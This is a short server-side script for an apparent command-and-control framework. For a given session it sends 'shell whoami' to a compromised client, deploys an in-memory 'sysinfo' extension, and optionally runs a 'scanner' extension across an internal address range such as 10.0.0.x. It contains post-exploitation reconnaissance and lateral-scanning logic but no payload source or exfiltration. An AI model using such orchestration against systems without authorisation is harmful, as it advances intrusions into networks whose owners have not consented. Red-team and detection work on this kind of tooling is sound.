// This script runs on the SERVER.
// It decides which logic to deploy to the CLIENT.
//
// Optional module arg: args[0] = URL prefix to scan for web services,
// e.g. "http://10.0.0." (scans .1-.254 via the scanner extension).
// Without it the network scan is skipped, which is stated in the output.

fn run(session_id, args) {
    print("Orchestrating Survey for Session: " + session_id);

    // 1. Run a basic shell command first
    send_c2_command(session_id, "shell whoami");

    // 2. Deploy the 'sysinfo' extension (In-Memory)
    // Pass empty array [] for no args
    let res1 = send_c2_extension(session_id, "sysinfo", []);

    // 3. Deploy the 'scanner' extension against the requested range
    if args.len < 1 {
        print("No scan range given; skipping network scan. Pass e.g. [\"http://10.0.0.\"] to enable it.");
        return "Deployed: " + res1 + " (scan skipped: no range)";
    }
    let res2 = send_c2_extension(session_id, "scanner", [args[0]]);

    return "Deployed: " + res1 + " and " + res2;
}
